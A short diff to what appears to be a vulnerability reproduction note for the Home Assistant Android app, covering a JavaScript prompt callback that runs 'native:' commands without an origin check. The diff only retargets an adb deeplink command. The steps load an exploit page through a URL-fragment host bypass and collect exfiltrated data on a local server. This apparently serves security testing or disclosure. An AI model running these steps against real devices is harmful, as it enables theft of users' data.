@@ -7,7 +7,7 @@ onJsPrompt handles native: prefix commands without origin check
 1. Start server: `python server.py`
 2. Trigger deeplink:
 ```
-adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/3.1.4_Insecure_JavaScript_Callback.html%23home-assistant.io"
+adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/3.1.4_Insecure_JavaScript_Callback.html%23home-assistant.io"
 ```
 3. Check `received/` for exfiltrated data
 
